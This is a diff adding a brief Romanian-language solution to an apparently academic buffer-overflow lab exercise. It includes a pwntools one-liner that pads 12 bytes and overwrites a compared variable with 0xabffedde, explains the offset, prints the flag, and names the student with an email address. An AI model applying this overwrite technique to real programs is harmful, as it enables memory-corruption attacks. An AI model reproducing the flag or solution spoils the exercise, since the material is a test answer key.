@@ -1,0 +1,12 @@
+elchapo187 - Popescu Lucian Ioan - luci.ion771@gmail.com - overflow_1
+
+Payload-ul e generat cu urmatoarea comanda:
+python -c 'from pwn import *;print "A"*12 + p32(0xabffedde)'
+
+Inceputul buffer-ului in care se citeste si variabila comparata cu numarul
+0xabffedde se afla la distanta de 0x18 - 0xc = 0xc bytes. Trebuie sa umplem 0xc
+bytes pentru a ajunge la inceputul variabilei, iar mai apoi sa scriem numarul
+dorit.
+
+Flagul este:
+iocla_I_did_not_chose_the_hack_life
